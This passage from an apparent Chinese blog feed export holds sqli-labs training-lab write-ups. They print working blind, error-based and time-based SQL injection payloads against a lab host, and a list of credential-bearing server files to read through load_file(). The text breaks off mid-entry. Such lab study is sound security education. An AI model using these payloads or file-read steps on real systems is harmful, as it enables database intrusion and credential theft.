-    <summary type="html">&lt;h2 id=&quot;load-file-导出文件&quot;&gt;&lt;a href=&quot;#load-file-导出文件&quot; class=&quot;headerlink&quot; title=&quot;load_file()导出文件&quot;&gt;&lt;/a&gt;load_file()导出文件&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&quot;使用条件：&quot;&gt;&lt;a href=&quot;#使用条件：&quot; class=&quot;headerlink&quot; title=&quot;使用条件：&quot;&gt;&lt;/a&gt;使用条件：&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;必须有权限读取并且文件必须完全可读 &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;and (select count(*) from mysql.user)&amp;gt;0&amp;#x2F;*    &amp;#x2F;&amp;#x2F;如果结果返回正常,说明具有读写权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;and (select count(*) from mysql.user)&amp;gt;0&amp;#x2F;*    &amp;#x2F;&amp;#x2F;返回错误，应该是管理员给数据库帐户降权了&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;欲读取文件必须在服务器上&lt;/li&gt;
-&lt;li&gt;必须指定文件完整的路径&lt;/li&gt;
-&lt;li&gt;欲读取文件必须小于 max_allowed_packet&lt;blockquote&gt;
-&lt;p&gt;如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的&lt;br&gt;就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有&lt;br&gt;administrators 才能访问的文件，users 就别想 load_file 出来&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;在实际的注入中，有两个难点需要解决：&quot;&gt;&lt;a href=&quot;#在实际的注入中，有两个难点需要解决：&quot; class=&quot;headerlink&quot; title=&quot;在实际的注入中，有两个难点需要解决：&quot;&gt;&lt;/a&gt;在实际的注入中，有两个难点需要解决：&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;绝对物理路径&lt;/li&gt;
-&lt;li&gt;构造有效的畸形语句（报错爆出绝对路径）&lt;blockquote&gt;
-&lt;p&gt;在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露&lt;br&gt;WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务&lt;br&gt;器的安全将受到严重的威胁.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&quot;常用路径：&quot;&gt;&lt;a href=&quot;#常用路径：&quot; class=&quot;headerlink&quot; title=&quot;常用路径：&quot;&gt;&lt;/a&gt;常用路径：&lt;/h3&gt;&lt;h4 id=&quot;WINDOWS下：&quot;&gt;&lt;a href=&quot;#WINDOWS下：&quot; class=&quot;headerlink&quot; title=&quot;WINDOWS下：&quot;&gt;&lt;/a&gt;WINDOWS下：&lt;/h4&gt;&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;路径&lt;/th&gt;
-&lt;th&gt;备注&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;&lt;tr&gt;
-&lt;td&gt;c:/boot.ini&lt;/td&gt;
-&lt;td&gt;查看系统版本&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:/windows/php.ini 或 c:/winnt/php.ini&lt;/td&gt;
-&lt;td&gt;php配置信息&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:/windows/my.ini 或 c:/winnt/my.ini 或 C:\Program Files\mysql\my.ini&lt;/td&gt;
-&lt;td&gt;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\mysql\data\mysql\user.MYD&lt;/td&gt;
-&lt;td&gt;存储了mysql.user表中的数据库连接密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini&lt;/td&gt;
-&lt;td&gt;存储了虚拟主机网站路径和密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\Program Files\Serv-U\ServUDaemon.ini&lt;/td&gt;
-&lt;td&gt;存储了虚拟主机网站路径和密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\windows\system32\inetsrv\MetaBase.xml&lt;/td&gt;
-&lt;td&gt;查看IIS的虚拟主机配置&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\windows\repair\sam&lt;/td&gt;
-&lt;td&gt;存储了WINDOWS系统初次安装的密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\Program Files\ Serv-U\ServUAdmin.exe&lt;/td&gt;
-&lt;td&gt;6.0版本以前的serv-u管理员密码存储&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\Program Files\RhinoSoft.com\ServUDaemon.exe&lt;/td&gt;
-&lt;td&gt;serv-u管理员密码存储&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件&lt;/td&gt;
-&lt;td&gt;存储了pcAnywhere的登陆密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf&lt;/td&gt;
-&lt;td&gt;查看WINDOWS系统apache文件&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:/Resin-3.0.14/conf/resin.conf&lt;/td&gt;
-&lt;td&gt;查看jsp开发的网站 resin文件配置信息&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf&lt;/td&gt;
-&lt;td&gt;查看linux系统配置的JSP虚拟主机&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;C:\mysql\data\mysql\user.MYD&lt;/td&gt;
-&lt;td&gt;存在MYSQL系统中的用户密码&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;
-&lt;h4 id=&quot;LUNIX-UNIX-下&quot;&gt;&lt;a href=&quot;#LUNIX-UNIX-下&quot; class=&quot;headerlink&quot; title=&quot;LUNIX/UNIX 下:&quot;&gt;&lt;/a&gt;LUNIX/UNIX 下:&lt;/h4&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs靶场Less-6</title>
-    <link href="https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-6/"/>
-    <id>https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-6/</id>
-    <published>2020-09-24T06:20:00.000Z</published>
-    <updated>2020-09-24T06:17:47.967Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><blockquote><p>Less6 与 less5 的区别在于 less6 在 id 参数传到服务器时，对 id 参数进行了处理。这里可以从源代码中可以看到。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>这一关的策略和less5是一样的，只需要将’换为”即可</p><p>演示其中一个payload。使用left()函数布尔注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-6&#x2F;?id&#x3D;1%22and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092409.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Less6&quot;&gt;&lt;a href=&quot;#Less6&quot; class=&quot;headerlink&quot; title=&quot;Less6&quot;&gt;&lt;/a&gt;Less6&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Less6 与 less5 的区别在于 less6 在 id 参数传到服务器时，对 id 参数进行了处理。这里可以从源代码中可以看到。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$id &amp;#x3D; &amp;#39;&amp;quot;&amp;#39;.$id.&amp;#39;&amp;quot;&amp;#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$sql&amp;#x3D;&amp;quot;SELECT * FROM users WHERE id&amp;#x3D;$id LIMIT 0,1&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;这一关的策略和less5是一样的，只需要将’换为”即可&lt;/p&gt;
-&lt;p&gt;演示其中一个payload。使用left()函数布尔注入&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;47.101.62.20:11567&amp;#x2F;Less-6&amp;#x2F;?id&amp;#x3D;1%22and%20left(version(),1)&amp;#x3D;5--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092409.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs靶场Less-5(延时盲注)</title>
-    <link href="https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8)/"/>
-    <id>https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8)/</id>
-    <published>2020-09-24T06:10:00.000Z</published>
-    <updated>2020-09-24T06:11:04.939Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用延时盲注演示</p><h3 id="利用sleep-函数"><a href="#利用sleep-函数" class="headerlink" title="利用sleep()函数"></a>利用sleep()函数</h3><p>sql语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))</span><br></pre></td></tr></table></figure><p>payload请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>当dadabase()的ASCII值不是116就延时5s然后页面返回空。此处改为115是正确返回</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092407.png" alt="image"></p><h3 id="利用-BENCHMARK-进行延时注入"><a href="#利用-BENCHMARK-进行延时注入" class="headerlink" title="利用 BENCHMARK()进行延时注入"></a>利用 BENCHMARK()进行延时注入</h3><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1</span><br></pre></td></tr></table></figure><p>payload请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27UNION%20SELECT%20(IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)),null)),2,3%20FROM%20(select%20database()%20as%20current)%20as%20tb1--+</span><br></pre></td></tr></table></figure><p>这里当返回结果正确的时候会延时5s返回，错误时不延时</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092408.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Less5&quot;&gt;&lt;a href=&quot;#Less5&quot; class=&quot;headerlink&quot; title=&quot;Less5&quot;&gt;&lt;/a&gt;Less5&lt;/h2&gt;&lt;p&gt;下面使用延时盲注演示&lt;/p&gt;
-&lt;h3 id=&quot;利用sleep-函数&quot;&gt;&lt;a href=&quot;#利用sleep-函数&quot; class=&quot;headerlink&quot; title=&quot;利用sleep()函数&quot;&gt;&lt;/a&gt;利用sleep()函数&lt;/h3&gt;&lt;p&gt;sql语句:&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;and If(ascii(substr(database(),1,1))&amp;#x3D;116,1,sleep(5))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;payload请求：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;47.101.62.20:11567&amp;#x2F;Less-5&amp;#x2F;?id&amp;#x3D;1%27and%20If(ascii(substr(database(),1,1))&amp;#x3D;116,1,sleep(5))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;当dadabase()的ASCII值不是116就延时5s然后页面返回空。此处改为115是正确返回&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092407.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;利用-BENCHMARK-进行延时注入&quot;&gt;&lt;a href=&quot;#利用-BENCHMARK-进行延时注入&quot; class=&quot;headerlink&quot; title=&quot;利用 BENCHMARK()进行延时注入&quot;&gt;&lt;/a&gt;利用 BENCHMARK()进行延时注入&lt;/h3&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs靶场Less-5(报错盲注)</title>
-    <link href="https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8)/"/>
-    <id>https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8)/</id>
-    <published>2020-09-24T05:50:00.000Z</published>
-    <updated>2020-09-24T05:52:05.995Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用报错盲注来演示</p><h3 id="BUG-8652报错盲注"><a href="#BUG-8652报错盲注" class="headerlink" title="BUG #8652报错盲注"></a>BUG #8652报错盲注</h3><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20Select%201,count(*),concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092401.png" alt="image"></p><h3 id="利用double数值类型超出范围进行报错注入"><a href="#利用double数值类型超出范围进行报错注入" class="headerlink" title="利用double数值类型超出范围进行报错注入"></a>利用double数值类型超出范围进行报错注入</h3><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (exp(~(select * FROM(SELECT USER())a))),2, 3</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(exp(~(select%20*%20FROM(SELECT%20USER())a))),2,%203--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092402.png" alt="image"></p><h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h3><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (!(select * from (select user())x) - ~0),2,3</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(!(select%20*%20from%20(select%20user())x)%20-%20~0),2,3--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092403.png" alt="image"></p><h3 id="xpath函数报错注入"><a href="#xpath函数报错注入" class="headerlink" title="xpath函数报错注入"></a>xpath函数报错注入</h3><h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20@@version),0x7e))--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092404.png" alt="image"></p><h4 id="使用updatexml-函数"><a href="#使用updatexml-函数" class="headerlink" title="使用updatexml()函数"></a>使用updatexml()函数</h4><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092405.png" alt="image"></p><h3 id="利用数据的重复性报错注入"><a href="#利用数据的重复性报错注入" class="headerlink" title="利用数据的重复性报错注入"></a>利用数据的重复性报错注入</h3><p>sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x</span><br></pre></td></tr></table></figure><p>请求payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27union%20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092406.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Less5&quot;&gt;&lt;a href=&quot;#Less5&quot; class=&quot;headerlink&quot; title=&quot;Less5&quot;&gt;&lt;/a&gt;Less5&lt;/h2&gt;&lt;p&gt;下面使用报错盲注来演示&lt;/p&gt;
-&lt;h3 id=&quot;BUG-8652报错盲注&quot;&gt;&lt;a href=&quot;#BUG-8652报错盲注&quot; class=&quot;headerlink&quot; title=&quot;BUG #8652报错盲注&quot;&gt;&lt;/a&gt;BUG #8652报错盲注&lt;/h3&gt;&lt;p&gt;sql语句：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;请求payload：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;47.101.62.20:11567&amp;#x2F;Less-5&amp;#x2F;?id&amp;#x3D;1%27%20union%20Select%201,count(*),concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092401.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;利用double数值类型超出范围进行报错注入&quot;&gt;&lt;a href=&quot;#利用double数值类型超出范围进行报错注入&quot; class=&quot;headerlink&quot; title=&quot;利用double数值类型超出范围进行报错注入&quot;&gt;&lt;/a&gt;利用double数值类型超出范围进行报错注入&lt;/h3&gt;&lt;p&gt;sql语句：&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs靶场Less-5(布尔盲注)</title>
-    <link href="https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/"/>
-    <id>https://hzktester.top/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</id>
-    <published>2020-09-23T12:39:00.000Z</published>
-    <updated>2020-09-23T12:40:33.831Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><blockquote><p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p></blockquote><p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092308.png" alt="image"></p><h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure><p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092309.png" alt="image"></p><p>当版本号不对的时候，则显示为空</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092310.png" alt="image"></p><p>猜测数据库长度，已知数据库长度为8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092311.png" alt="image"></p><p>猜测数据库第一位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure><p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092312.png" alt="image"></p><p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 